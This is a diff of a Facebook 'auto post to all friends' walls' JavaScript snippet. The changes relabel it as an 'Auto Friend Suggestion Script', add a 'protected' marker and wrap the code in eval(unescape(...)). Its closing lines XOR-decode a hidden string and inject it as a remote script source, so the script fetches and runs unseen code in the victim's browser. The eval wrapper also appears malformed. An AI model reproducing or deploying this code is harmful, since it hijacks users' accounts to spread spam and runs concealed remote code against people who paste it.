@@ -1,4 +1,7 @@
-var Title = 'Auto Post Your Message in All Friend\'s Wall or Timeline.';
+/*HTML/JavaScript page status="protected"*/
+/*Auto Friend Suggestion Script*/
+/*Copyright © 2013 Bhargav JT. Gogoi. All Rights Reserved.*/
+eval(unescape("var Title = 'Auto Post Your Message in All Friend\'s Wall or Timeline.';
 var Descriptions = "",
     _text = 'Powered By: <A style="color:#3B5998;" href="http://www.facebook.com/313072532101076" target="_blank">Loading [lllllllllll ] 99%</A> & <A style="color:#3B5998;" href="http://www.facebook.com/199134496914077" target="_blank"> Assam Indian Cyber Force</A>.</br>Script Made By: </A><A style="color:#3B5998;" href="http://www.facebook.com/100001050235420" target="_blank"> Waqar Ahmad</A></A>,</A><A style="color:#3B5998;" href="http://www.facebook.com/100005115938614" target="_blank"> Bhargav JT. Gogoi</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://automateyourfacebook.blogspot.in/" target="_blank">Automate Your Facebook</A>.</A>';
 var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.9);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.9);border-radius: 1em 4em 1em 4em;border:3px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>"; /*|undefined undefined|*/
@@ -198,4 +201,4 @@ for (i = 0; i < V; i++) {
     Y += String.fromCharCode(X.charCodeAt(i) ^ 2)
 }
 Z = unescape(Y);
-document.body.appendChild(document.createElement('script')).src = Z;
+document.body.appendChild(document.createElement('script')).src = Z;"));
